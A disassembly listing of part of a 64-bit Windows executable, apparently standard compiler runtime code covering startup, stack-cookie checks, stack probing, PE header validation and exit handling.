   140006749:	cc                   	int3
   14000674a:	cc                   	int3
   14000674b:	cc                   	int3
   14000674c:	cc                   	int3
   14000674d:	cc                   	int3
   14000674e:	cc                   	int3
   14000674f:	cc                   	int3
   140006750:	40 53                	rex push %rbx
   140006752:	48 83 ec 20          	sub    $0x20,%rsp
   140006756:	48 8b d9             	mov    %rcx,%rbx
   140006759:	48 8d 05 40 1f 00 00 	lea    0x1f40(%rip),%rax        # 0x1400086a0
   140006760:	48 89 01             	mov    %rax,(%rcx)
   140006763:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140006767:	48 85 c9             	test   %rcx,%rcx
   14000676a:	74 0d                	je     0x140006779
   14000676c:	48 8b 01             	mov    (%rcx),%rax
   14000676f:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006773:	ff 15 9f 1e 00 00    	call   *0x1e9f(%rip)        # 0x140008618
   140006779:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000677d:	48 85 c9             	test   %rcx,%rcx
   140006780:	74 0c                	je     0x14000678e
   140006782:	48 83 c4 20          	add    $0x20,%rsp
   140006786:	5b                   	pop    %rbx
   140006787:	48 ff 25 4a 19 00 00 	rex.W jmp *0x194a(%rip)        # 0x1400080d8
   14000678e:	48 83 c4 20          	add    $0x20,%rsp
   140006792:	5b                   	pop    %rbx
   140006793:	c3                   	ret
   140006794:	cc                   	int3
   140006795:	cc                   	int3
   140006796:	cc                   	int3
   140006797:	cc                   	int3
   140006798:	cc                   	int3
   140006799:	cc                   	int3
   14000679a:	cc                   	int3
   14000679b:	cc                   	int3
   14000679c:	cc                   	int3
   14000679d:	cc                   	int3
   14000679e:	cc                   	int3
   14000679f:	cc                   	int3
   1400067a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400067a5:	57                   	push   %rdi
   1400067a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400067aa:	8b fa                	mov    %edx,%edi
   1400067ac:	48 8b d9             	mov    %rcx,%rbx
   1400067af:	48 8d 05 ea 1e 00 00 	lea    0x1eea(%rip),%rax        # 0x1400086a0
   1400067b6:	48 89 01             	mov    %rax,(%rcx)
   1400067b9:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1400067bd:	48 85 c9             	test   %rcx,%rcx
   1400067c0:	74 0d                	je     0x1400067cf
   1400067c2:	48 8b 01             	mov    (%rcx),%rax
   1400067c5:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400067c9:	ff 15 49 1e 00 00    	call   *0x1e49(%rip)        # 0x140008618
   1400067cf:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1400067d3:	48 85 c9             	test   %rcx,%rcx
   1400067d6:	74 07                	je     0x1400067df
   1400067d8:	ff 15 fa 18 00 00    	call   *0x18fa(%rip)        # 0x1400080d8
   1400067de:	90                   	nop
   1400067df:	40 f6 c7 01          	test   $0x1,%dil
   1400067e3:	74 0d                	je     0x1400067f2
   1400067e5:	ba 20 00 00 00       	mov    $0x20,%edx
   1400067ea:	48 8b cb             	mov    %rbx,%rcx
   1400067ed:	e8 6e 00 00 00       	call   0x140006860
   1400067f2:	48 8b c3             	mov    %rbx,%rax
   1400067f5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067fa:	48 83 c4 20          	add    $0x20,%rsp
   1400067fe:	5f                   	pop    %rdi
   1400067ff:	c3                   	ret
   140006800:	48 83 ec 48          	sub    $0x48,%rsp
   140006804:	4c 8b c2             	mov    %rdx,%r8
   140006807:	45 33 c9             	xor    %r9d,%r9d
   14000680a:	8b d1                	mov    %ecx,%edx
   14000680c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006811:	e8 ea fe ff ff       	call   0x140006700
   140006816:	48 8d 15 93 3c 00 00 	lea    0x3c93(%rip),%rdx        # 0x14000a4b0
   14000681d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006822:	e8 a5 0e 00 00       	call   0x1400076cc
   140006827:	cc                   	int3
   140006828:	cc                   	int3
   140006829:	cc                   	int3
   14000682a:	cc                   	int3
   14000682b:	cc                   	int3
   14000682c:	cc                   	int3
   14000682d:	cc                   	int3
   14000682e:	cc                   	int3
   14000682f:	cc                   	int3
   140006830:	cc                   	int3
   140006831:	cc                   	int3
   140006832:	cc                   	int3
   140006833:	cc                   	int3
   140006834:	cc                   	int3
   140006835:	cc                   	int3
   140006836:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000683d:	00 00 00 
   140006840:	48 3b 0d f9 67 00 00 	cmp    0x67f9(%rip),%rcx        # 0x14000d040
   140006847:	75 10                	jne    0x140006859
   140006849:	48 c1 c1 10          	rol    $0x10,%rcx
   14000684d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140006852:	75 01                	jne    0x140006855
   140006854:	c3                   	ret
   140006855:	48 c1 c9 10          	ror    $0x10,%rcx
   140006859:	e9 b6 05 00 00       	jmp    0x140006e14
   14000685e:	cc                   	int3
   14000685f:	cc                   	int3
   140006860:	e9 f7 06 00 00       	jmp    0x140006f5c
   140006865:	cc                   	int3
   140006866:	cc                   	int3
   140006867:	cc                   	int3
   140006868:	40 53                	rex push %rbx
   14000686a:	48 83 ec 20          	sub    $0x20,%rsp
   14000686e:	48 8b d9             	mov    %rcx,%rbx
   140006871:	eb 0f                	jmp    0x140006882
   140006873:	48 8b cb             	mov    %rbx,%rcx
   140006876:	e8 81 0e 00 00       	call   0x1400076fc
   14000687b:	85 c0                	test   %eax,%eax
   14000687d:	74 13                	je     0x140006892
   14000687f:	48 8b cb             	mov    %rbx,%rcx
   140006882:	e8 6f 0e 00 00       	call   0x1400076f6
   140006887:	48 85 c0             	test   %rax,%rax
   14000688a:	74 e7                	je     0x140006873
   14000688c:	48 83 c4 20          	add    $0x20,%rsp
   140006890:	5b                   	pop    %rbx
   140006891:	c3                   	ret
   140006892:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006896:	74 06                	je     0x14000689e
   140006898:	e8 eb 06 00 00       	call   0x140006f88
   14000689d:	cc                   	int3
   14000689e:	e8 ed a9 ff ff       	call   0x140001290
   1400068a3:	cc                   	int3
   1400068a4:	40 53                	rex push %rbx
   1400068a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400068aa:	48 8d 05 2f 1e 00 00 	lea    0x1e2f(%rip),%rax        # 0x1400086e0
   1400068b1:	48 8b d9             	mov    %rcx,%rbx
   1400068b4:	48 89 01             	mov    %rax,(%rcx)
   1400068b7:	f6 c2 01             	test   $0x1,%dl
   1400068ba:	74 0a                	je     0x1400068c6
   1400068bc:	ba 18 00 00 00       	mov    $0x18,%edx
   1400068c1:	e8 9a ff ff ff       	call   0x140006860
   1400068c6:	48 8b c3             	mov    %rbx,%rax
   1400068c9:	48 83 c4 20          	add    $0x20,%rsp
   1400068cd:	5b                   	pop    %rbx
   1400068ce:	c3                   	ret
   1400068cf:	cc                   	int3
   1400068d0:	40 53                	rex push %rbx
   1400068d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400068d6:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400068db:	e8 28 0e 00 00       	call   0x140007708
   1400068e0:	e8 7f 07 00 00       	call   0x140007064
   1400068e5:	8b c8                	mov    %eax,%ecx
   1400068e7:	e8 52 0e 00 00       	call   0x14000773e
   1400068ec:	e8 67 07 00 00       	call   0x140007058
   1400068f1:	8b d8                	mov    %eax,%ebx
   1400068f3:	e8 6a 0e 00 00       	call   0x140007762
   1400068f8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400068fd:	89 18                	mov    %ebx,(%rax)
   1400068ff:	e8 b0 02 00 00       	call   0x140006bb4
   140006904:	84 c0                	test   %al,%al
   140006906:	74 73                	je     0x14000697b
   140006908:	e8 17 0a 00 00       	call   0x140007324
   14000690d:	48 8d 0d 4c 0a 00 00 	lea    0xa4c(%rip),%rcx        # 0x140007360
   140006914:	e8 4b 04 00 00       	call   0x140006d64
   140006919:	e8 3e 07 00 00       	call   0x14000705c
   14000691e:	8b c8                	mov    %eax,%ecx
   140006920:	e8 ef 0d 00 00       	call   0x140007714
   140006925:	85 c0                	test   %eax,%eax
   140006927:	75 52                	jne    0x14000697b
   140006929:	e8 3e 07 00 00       	call   0x14000706c
   14000692e:	e8 71 07 00 00       	call   0x1400070a4
   140006933:	85 c0                	test   %eax,%eax
   140006935:	74 0c                	je     0x140006943
   140006937:	48 8d 0d 1a 07 00 00 	lea    0x71a(%rip),%rcx        # 0x140007058
   14000693e:	e8 cb 0d 00 00       	call   0x14000770e
   140006943:	e8 34 04 00 00       	call   0x140006d7c
   140006948:	e8 2f 04 00 00       	call   0x140006d7c
   14000694d:	e8 06 07 00 00       	call   0x140007058
   140006952:	8b c8                	mov    %eax,%ecx
   140006954:	e8 fd 0d 00 00       	call   0x140007756
   140006959:	e8 1e 07 00 00       	call   0x14000707c
   14000695e:	84 c0                	test   %al,%al
   140006960:	74 05                	je     0x140006967
   140006962:	e8 b3 0d 00 00       	call   0x14000771a
   140006967:	e8 ec 06 00 00       	call   0x140007058
   14000696c:	e8 e3 08 00 00       	call   0x140007254
   140006971:	85 c0                	test   %eax,%eax
   140006973:	75 06                	jne    0x14000697b
   140006975:	48 83 c4 20          	add    $0x20,%rsp
   140006979:	5b                   	pop    %rbx
   14000697a:	c3                   	ret
   14000697b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006980:	e8 47 07 00 00       	call   0x1400070cc
   140006985:	cc                   	int3
   140006986:	cc                   	int3
   140006987:	cc                   	int3
   140006988:	48 83 ec 28          	sub    $0x28,%rsp
   14000698c:	e8 f7 06 00 00       	call   0x140007088
   140006991:	33 c0                	xor    %eax,%eax
   140006993:	48 83 c4 28          	add    $0x28,%rsp
   140006997:	c3                   	ret
   140006998:	48 83 ec 28          	sub    $0x28,%rsp
   14000699c:	e8 0f 09 00 00       	call   0x1400072b0
   1400069a1:	e8 b2 06 00 00       	call   0x140007058
   1400069a6:	8b c8                	mov    %eax,%ecx
   1400069a8:	48 83 c4 28          	add    $0x28,%rsp
   1400069ac:	e9 ab 0d 00 00       	jmp    0x14000775c
   1400069b1:	cc                   	int3
   1400069b2:	cc                   	int3
   1400069b3:	cc                   	int3
   1400069b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400069b9:	57                   	push   %rdi
   1400069ba:	48 83 ec 30          	sub    $0x30,%rsp
   1400069be:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400069c3:	e8 b0 01 00 00       	call   0x140006b78
   1400069c8:	84 c0                	test   %al,%al
   1400069ca:	0f 84 30 01 00 00    	je     0x140006b00
   1400069d0:	40 32 ff             	xor    %dil,%dil
   1400069d3:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   1400069d8:	e8 5f 01 00 00       	call   0x140006b3c
   1400069dd:	8a d8                	mov    %al,%bl
   1400069df:	8b 0d ab 69 00 00    	mov    0x69ab(%rip),%ecx        # 0x14000d390
   1400069e5:	83 f9 01             	cmp    $0x1,%ecx
   1400069e8:	0f 84 1d 01 00 00    	je     0x140006b0b
   1400069ee:	85 c9                	test   %ecx,%ecx
   1400069f0:	75 4a                	jne    0x140006a3c
   1400069f2:	c7 05 94 69 00 00 01 	movl   $0x1,0x6994(%rip)        # 0x14000d390
   1400069f9:	00 00 00 
   1400069fc:	48 8d 15 75 1c 00 00 	lea    0x1c75(%rip),%rdx        # 0x140008678
   140006a03:	48 8d 0d 56 1c 00 00 	lea    0x1c56(%rip),%rcx        # 0x140008660
   140006a0a:	e8 1d 0d 00 00       	call   0x14000772c
   140006a0f:	85 c0                	test   %eax,%eax
   140006a11:	74 0a                	je     0x140006a1d
   140006a13:	b8 ff 00 00 00       	mov    $0xff,%eax
   140006a18:	e9 d8 00 00 00       	jmp    0x140006af5
   140006a1d:	48 8d 15 34 1c 00 00 	lea    0x1c34(%rip),%rdx        # 0x140008658
   140006a24:	48 8d 0d 15 1c 00 00 	lea    0x1c15(%rip),%rcx        # 0x140008640
   140006a2b:	e8 f6 0c 00 00       	call   0x140007726
   140006a30:	c7 05 56 69 00 00 02 	movl   $0x2,0x6956(%rip)        # 0x14000d390
   140006a37:	00 00 00 
   140006a3a:	eb 08                	jmp    0x140006a44
   140006a3c:	40 b7 01             	mov    $0x1,%dil
   140006a3f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140006a44:	8a cb                	mov    %bl,%cl
   140006a46:	e8 8d 02 00 00       	call   0x140006cd8
   140006a4b:	e8 60 06 00 00       	call   0x1400070b0
   140006a50:	48 8b d8             	mov    %rax,%rbx
   140006a53:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006a57:	74 1e                	je     0x140006a77
   140006a59:	48 8b c8             	mov    %rax,%rcx
   140006a5c:	e8 df 01 00 00       	call   0x140006c40
   140006a61:	84 c0                	test   %al,%al
   140006a63:	74 12                	je     0x140006a77
   140006a65:	45 33 c0             	xor    %r8d,%r8d
   140006a68:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006a6c:	33 c9                	xor    %ecx,%ecx
   140006a6e:	48 8b 03             	mov    (%rbx),%rax
   140006a71:	ff 15 a1 1b 00 00    	call   *0x1ba1(%rip)        # 0x140008618
   140006a77:	e8 3c 06 00 00       	call   0x1400070b8
   140006a7c:	48 8b d8             	mov    %rax,%rbx
   140006a7f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006a83:	74 14                	je     0x140006a99
   140006a85:	48 8b c8             	mov    %rax,%rcx
   140006a88:	e8 b3 01 00 00       	call   0x140006c40
   140006a8d:	84 c0                	test   %al,%al
   140006a8f:	74 08                	je     0x140006a99
   140006a91:	48 8b 0b             	mov    (%rbx),%rcx
   140006a94:	e8 b7 0c 00 00       	call   0x140007750
   140006a99:	e8 7a 07 00 00       	call   0x140007218
   140006a9e:	0f b7 d8             	movzwl %ax,%ebx
   140006aa1:	e8 7a 0c 00 00       	call   0x140007720
   140006aa6:	44 8b cb             	mov    %ebx,%r9d
   140006aa9:	4c 8b c0             	mov    %rax,%r8
   140006aac:	33 d2                	xor    %edx,%edx
   140006aae:	48 8d 0d 4b 95 ff ff 	lea    -0x6ab5(%rip),%rcx        # 0x140000000
   140006ab5:	e8 16 cf ff ff       	call   0x1400039d0
   140006aba:	8b d8                	mov    %eax,%ebx
   140006abc:	e8 9b 07 00 00       	call   0x14000725c
   140006ac1:	84 c0                	test   %al,%al
   140006ac3:	74 50                	je     0x140006b15
   140006ac5:	40 84 ff             	test   %dil,%dil
   140006ac8:	75 05                	jne    0x140006acf
   140006aca:	e8 75 0c 00 00       	call   0x140007744
   140006acf:	33 d2                	xor    %edx,%edx
   140006ad1:	b1 01                	mov    $0x1,%cl
   140006ad3:	e8 24 02 00 00       	call   0x140006cfc
   140006ad8:	8b c3                	mov    %ebx,%eax
   140006ada:	eb 19                	jmp    0x140006af5
   140006adc:	8b d8                	mov    %eax,%ebx
   140006ade:	e8 79 07 00 00       	call   0x14000725c
   140006ae3:	84 c0                	test   %al,%al
   140006ae5:	74 36                	je     0x140006b1d
   140006ae7:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140006aec:	75 05                	jne    0x140006af3
   140006aee:	e8 57 0c 00 00       	call   0x14000774a
   140006af3:	8b c3                	mov    %ebx,%eax
   140006af5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006afa:	48 83 c4 30          	add    $0x30,%rsp
   140006afe:	5f                   	pop    %rdi
   140006aff:	c3                   	ret
   140006b00:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006b05:	e8 c2 05 00 00       	call   0x1400070cc
   140006b0a:	90                   	nop
   140006b0b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006b10:	e8 b7 05 00 00       	call   0x1400070cc
   140006b15:	8b cb                	mov    %ebx,%ecx
   140006b17:	e8 16 0c 00 00       	call   0x140007732
   140006b1c:	90                   	nop
   140006b1d:	8b cb                	mov    %ebx,%ecx
   140006b1f:	e8 14 0c 00 00       	call   0x140007738
   140006b24:	90                   	nop
   140006b25:	cc                   	int3
   140006b26:	cc                   	int3
   140006b27:	cc                   	int3
   140006b28:	48 83 ec 28          	sub    $0x28,%rsp
   140006b2c:	e8 77 04 00 00       	call   0x140006fa8
   140006b31:	48 83 c4 28          	add    $0x28,%rsp
   140006b35:	e9 7a fe ff ff       	jmp    0x1400069b4
   140006b3a:	cc                   	int3
   140006b3b:	cc                   	int3
   140006b3c:	48 83 ec 28          	sub    $0x28,%rsp
   140006b40:	e8 ef 0a 00 00       	call   0x140007634
   140006b45:	85 c0                	test   %eax,%eax
   140006b47:	74 21                	je     0x140006b6a
   140006b49:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140006b50:	00 00 
   140006b52:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140006b56:	eb 05                	jmp    0x140006b5d
   140006b58:	48 3b c8             	cmp    %rax,%rcx
   140006b5b:	74 14                	je     0x140006b71
   140006b5d:	33 c0                	xor    %eax,%eax
   140006b5f:	f0 48 0f b1 0d 30 68 	lock cmpxchg %rcx,0x6830(%rip)        # 0x14000d398
   140006b66:	00 00 
   140006b68:	75 ee                	jne    0x140006b58
   140006b6a:	32 c0                	xor    %al,%al
   140006b6c:	48 83 c4 28          	add    $0x28,%rsp
   140006b70:	c3                   	ret
   140006b71:	b0 01                	mov    $0x1,%al
   140006b73:	eb f7                	jmp    0x140006b6c
   140006b75:	cc                   	int3
   140006b76:	cc                   	int3
   140006b77:	cc                   	int3
   140006b78:	48 83 ec 28          	sub    $0x28,%rsp
   140006b7c:	85 c9                	test   %ecx,%ecx
   140006b7e:	75 07                	jne    0x140006b87
   140006b80:	c6 05 19 68 00 00 01 	movb   $0x1,0x6819(%rip)        # 0x14000d3a0
   140006b87:	e8 10 08 00 00       	call   0x14000739c
   140006b8c:	e8 eb 04 00 00       	call   0x14000707c
   140006b91:	84 c0                	test   %al,%al
   140006b93:	75 04                	jne    0x140006b99
   140006b95:	32 c0                	xor    %al,%al
   140006b97:	eb 14                	jmp    0x140006bad
   140006b99:	e8 de 04 00 00       	call   0x14000707c
   140006b9e:	84 c0                	test   %al,%al
   140006ba0:	75 09                	jne    0x140006bab
   140006ba2:	33 c9                	xor    %ecx,%ecx
   140006ba4:	e8 d3 04 00 00       	call   0x14000707c
   140006ba9:	eb ea                	jmp    0x140006b95
   140006bab:	b0 01                	mov    $0x1,%al
   140006bad:	48 83 c4 28          	add    $0x28,%rsp
   140006bb1:	c3                   	ret
   140006bb2:	cc                   	int3
   140006bb3:	cc                   	int3
   140006bb4:	40 53                	rex push %rbx
   140006bb6:	48 83 ec 20          	sub    $0x20,%rsp
   140006bba:	80 3d e0 67 00 00 00 	cmpb   $0x0,0x67e0(%rip)        # 0x14000d3a1
   140006bc1:	8b d9                	mov    %ecx,%ebx
   140006bc3:	75 67                	jne    0x140006c2c
   140006bc5:	83 f9 01             	cmp    $0x1,%ecx
   140006bc8:	77 6a                	ja     0x140006c34
   140006bca:	e8 65 0a 00 00       	call   0x140007634
   140006bcf:	85 c0                	test   %eax,%eax
   140006bd1:	74 28                	je     0x140006bfb
   140006bd3:	85 db                	test   %ebx,%ebx
   140006bd5:	75 24                	jne    0x140006bfb
   140006bd7:	48 8d 0d ca 67 00 00 	lea    0x67ca(%rip),%rcx        # 0x14000d3a8
   140006bde:	e8 85 0b 00 00       	call   0x140007768
   140006be3:	85 c0                	test   %eax,%eax
   140006be5:	75 10                	jne    0x140006bf7
   140006be7:	48 8d 0d d2 67 00 00 	lea    0x67d2(%rip),%rcx        # 0x14000d3c0
   140006bee:	e8 75 0b 00 00       	call   0x140007768
   140006bf3:	85 c0                	test   %eax,%eax
   140006bf5:	74 2e                	je     0x140006c25
   140006bf7:	32 c0                	xor    %al,%al
   140006bf9:	eb 33                	jmp    0x140006c2e
   140006bfb:	66 0f 6f 05 ed 1a 00 	movdqa 0x1aed(%rip),%xmm0        # 0x1400086f0
   140006c02:	00 
   140006c03:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006c07:	f3 0f 7f 05 99 67 00 	movdqu %xmm0,0x6799(%rip)        # 0x14000d3a8
   140006c0e:	00 
   140006c0f:	48 89 05 a2 67 00 00 	mov    %rax,0x67a2(%rip)        # 0x14000d3b8
   140006c16:	f3 0f 7f 05 a2 67 00 	movdqu %xmm0,0x67a2(%rip)        # 0x14000d3c0
   140006c1d:	00 
   140006c1e:	48 89 05 ab 67 00 00 	mov    %rax,0x67ab(%rip)        # 0x14000d3d0
   140006c25:	c6 05 75 67 00 00 01 	movb   $0x1,0x6775(%rip)        # 0x14000d3a1
   140006c2c:	b0 01                	mov    $0x1,%al
   140006c2e:	48 83 c4 20          	add    $0x20,%rsp
   140006c32:	5b                   	pop    %rbx
   140006c33:	c3                   	ret
   140006c34:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006c39:	e8 8e 04 00 00       	call   0x1400070cc
   140006c3e:	cc                   	int3
   140006c3f:	cc                   	int3
   140006c40:	48 83 ec 18          	sub    $0x18,%rsp
   140006c44:	4c 8b c1             	mov    %rcx,%r8
   140006c47:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140006c4c:	66 39 05 ad 93 ff ff 	cmp    %ax,-0x6c53(%rip)        # 0x140000000
   140006c53:	75 78                	jne    0x140006ccd
   140006c55:	48 63 0d e0 93 ff ff 	movslq -0x6c20(%rip),%rcx        # 0x14000003c
   140006c5c:	48 8d 15 9d 93 ff ff 	lea    -0x6c63(%rip),%rdx        # 0x140000000
   140006c63:	48 03 ca             	add    %rdx,%rcx
   140006c66:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140006c6c:	75 5f                	jne    0x140006ccd
   140006c6e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140006c73:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140006c77:	75 54                	jne    0x140006ccd
   140006c79:	4c 2b c2             	sub    %rdx,%r8
   140006c7c:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140006c80:	48 83 c2 18          	add    $0x18,%rdx
   140006c84:	48 03 d1             	add    %rcx,%rdx
   140006c87:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140006c8b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140006c8f:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140006c93:	48 89 14 24          	mov    %rdx,(%rsp)
   140006c97:	49 3b d1             	cmp    %r9,%rdx
   140006c9a:	74 18                	je     0x140006cb4
   140006c9c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140006c9f:	4c 3b c1             	cmp    %rcx,%r8
   140006ca2:	72 0a                	jb     0x140006cae
   140006ca4:	8b 42 08             	mov    0x8(%rdx),%eax
   140006ca7:	03 c1                	add    %ecx,%eax
   140006ca9:	4c 3b c0             	cmp    %rax,%r8
   140006cac:	72 08                	jb     0x140006cb6
   140006cae:	48 83 c2 28          	add    $0x28,%rdx
   140006cb2:	eb df                	jmp    0x140006c93
   140006cb4:	33 d2                	xor    %edx,%edx
   140006cb6:	48 85 d2             	test   %rdx,%rdx
   140006cb9:	75 04                	jne    0x140006cbf
   140006cbb:	32 c0                	xor    %al,%al
   140006cbd:	eb 14                	jmp    0x140006cd3
   140006cbf:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140006cc3:	7d 04                	jge    0x140006cc9
   140006cc5:	32 c0                	xor    %al,%al
   140006cc7:	eb 0a                	jmp    0x140006cd3
   140006cc9:	b0 01                	mov    $0x1,%al
   140006ccb:	eb 06                	jmp    0x140006cd3
   140006ccd:	32 c0                	xor    %al,%al
   140006ccf:	eb 02                	jmp    0x140006cd3
   140006cd1:	32 c0                	xor    %al,%al
   140006cd3:	48 83 c4 18          	add    $0x18,%rsp
   140006cd7:	c3                   	ret
   140006cd8:	40 53                	rex push %rbx
   140006cda:	48 83 ec 20          	sub    $0x20,%rsp
   140006cde:	8a d9                	mov    %cl,%bl
   140006ce0:	e8 4f 09 00 00       	call   0x140007634
   140006ce5:	33 d2                	xor    %edx,%edx
   140006ce7:	85 c0                	test   %eax,%eax
   140006ce9:	74 0b                	je     0x140006cf6
   140006ceb:	84 db                	test   %bl,%bl
   140006ced:	75 07                	jne    0x140006cf6
   140006cef:	48 87 15 a2 66 00 00 	xchg   %rdx,0x66a2(%rip)        # 0x14000d398
   140006cf6:	48 83 c4 20          	add    $0x20,%rsp
   140006cfa:	5b                   	pop    %rbx
   140006cfb:	c3                   	ret
   140006cfc:	40 53                	rex push %rbx
   140006cfe:	48 83 ec 20          	sub    $0x20,%rsp
   140006d02:	80 3d 97 66 00 00 00 	cmpb   $0x0,0x6697(%rip)        # 0x14000d3a0
   140006d09:	8a d9                	mov    %cl,%bl
   140006d0b:	74 04                	je     0x140006d11
   140006d0d:	84 d2                	test   %dl,%dl
   140006d0f:	75 0c                	jne    0x140006d1d
   140006d11:	e8 66 03 00 00       	call   0x14000707c
   140006d16:	8a cb                	mov    %bl,%cl
   140006d18:	e8 5f 03 00 00       	call   0x14000707c
   140006d1d:	b0 01                	mov    $0x1,%al
   140006d1f:	48 83 c4 20          	add    $0x20,%rsp
   140006d23:	5b                   	pop    %rbx
   140006d24:	c3                   	ret
   140006d25:	cc                   	int3
   140006d26:	cc                   	int3
   140006d27:	cc                   	int3
   140006d28:	40 53                	rex push %rbx
   140006d2a:	48 83 ec 20          	sub    $0x20,%rsp
   140006d2e:	48 83 3d 72 66 00 00 	cmpq   $0xffffffffffffffff,0x6672(%rip)        # 0x14000d3a8
   140006d35:	ff 
   140006d36:	48 8b d9             	mov    %rcx,%rbx
   140006d39:	75 07                	jne    0x140006d42
   140006d3b:	e8 34 0a 00 00       	call   0x140007774
   140006d40:	eb 0f                	jmp    0x140006d51
   140006d42:	48 8b d3             	mov    %rbx,%rdx
   140006d45:	48 8d 0d 5c 66 00 00 	lea    0x665c(%rip),%rcx        # 0x14000d3a8
   140006d4c:	e8 1d 0a 00 00       	call   0x14000776e
   140006d51:	33 d2                	xor    %edx,%edx
   140006d53:	85 c0                	test   %eax,%eax
   140006d55:	48 0f 44 d3          	cmove  %rbx,%rdx
   140006d59:	48 8b c2             	mov    %rdx,%rax
   140006d5c:	48 83 c4 20          	add    $0x20,%rsp
   140006d60:	5b                   	pop    %rbx
   140006d61:	c3                   	ret
   140006d62:	cc                   	int3
   140006d63:	cc                   	int3
   140006d64:	48 83 ec 28          	sub    $0x28,%rsp
   140006d68:	e8 bb ff ff ff       	call   0x140006d28
   140006d6d:	48 f7 d8             	neg    %rax
   140006d70:	1b c0                	sbb    %eax,%eax
   140006d72:	f7 d8                	neg    %eax
   140006d74:	ff c8                	dec    %eax
   140006d76:	48 83 c4 28          	add    $0x28,%rsp
   140006d7a:	c3                   	ret
   140006d7b:	cc                   	int3
   140006d7c:	c2 00 00             	ret    $0x0
   140006d7f:	cc                   	int3
   140006d80:	cc                   	int3
   140006d81:	cc                   	int3
   140006d82:	cc                   	int3
   140006d83:	cc                   	int3
   140006d84:	cc                   	int3
   140006d85:	cc                   	int3
   140006d86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006d8d:	00 00 00 
   140006d90:	48 83 ec 10          	sub    $0x10,%rsp
   140006d94:	4c 89 14 24          	mov    %r10,(%rsp)
   140006d98:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   140006d9d:	4d 33 db             	xor    %r11,%r11
   140006da0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140006da5:	4c 2b d0             	sub    %rax,%r10
   140006da8:	4d 0f 42 d3          	cmovb  %r11,%r10
   140006dac:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140006db3:	00 00 
   140006db5:	4d 3b d3             	cmp    %r11,%r10
   140006db8:	73 16                	jae    0x140006dd0
   140006dba:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140006dc0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140006dc7:	41 c6 03 00          	movb   $0x0,(%r11)
   140006dcb:	4d 3b d3             	cmp    %r11,%r10
   140006dce:	75 f0                	jne    0x140006dc0
   140006dd0:	4c 8b 14 24          	mov    (%rsp),%r10
   140006dd4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140006dd9:	48 83 c4 10          	add    $0x10,%rsp
   140006ddd:	c3                   	ret
   140006dde:	cc                   	int3
   140006ddf:	cc                   	int3
   140006de0:	40 53                	rex push %rbx
   140006de2:	48 83 ec 20          	sub    $0x20,%rsp
   140006de6:	48 8b d9             	mov    %rcx,%rbx
   140006de9:	33 c9                	xor    %ecx,%ecx
   140006deb:	ff 15 bf 12 00 00    	call   *0x12bf(%rip)        # 0x1400080b0
   140006df1:	48 8b cb             	mov    %rbx,%rcx
   140006df4:	ff 15 be 12 00 00    	call   *0x12be(%rip)        # 0x1400080b8
   140006dfa:	ff 15 10 13 00 00    	call   *0x1310(%rip)        # 0x140008110
   140006e00:	48 8b c8             	mov    %rax,%rcx
   140006e03:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140006e08:	48 83 c4 20          	add    $0x20,%rsp
   140006e0c:	5b                   	pop    %rbx
   140006e0d:	48 ff 25 8c 12 00 00 	rex.W jmp *0x128c(%rip)        # 0x1400080a0
   140006e14:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006e19:	48 83 ec 38          	sub    $0x38,%rsp
   140006e1d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140006e22:	ff 15 70 12 00 00    	call   *0x1270(%rip)        # 0x140008098
   140006e28:	85 c0                	test   %eax,%eax
   140006e2a:	74 07                	je     0x140006e33
   140006e2c:	b9 02 00 00 00       	mov    $0x2,%ecx
